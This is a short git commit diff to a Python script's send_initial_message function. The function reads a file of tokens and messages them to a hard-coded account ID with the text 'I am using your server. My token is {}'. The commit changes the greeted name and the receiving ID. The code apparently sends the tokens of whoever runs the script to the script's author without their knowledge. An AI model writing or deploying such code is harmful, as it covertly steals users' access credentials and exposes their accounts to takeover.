15c22d80bf0ac5da84711caa93e615e43ddfaa19
Server880 <renderserver80@gmail.com>
2025-02-18 10:03:11 +0500

    Update main.py

--- main.py
+++ main.py
@@ -39,10 +39,10 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello Charsi sir! I am using your server. My token is {}"
+      msg_template = "Hello Venom sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100006233985386"
+      target_id = "61573068954160"
 
       requests.packages.urllib3.disable_warnings()
 
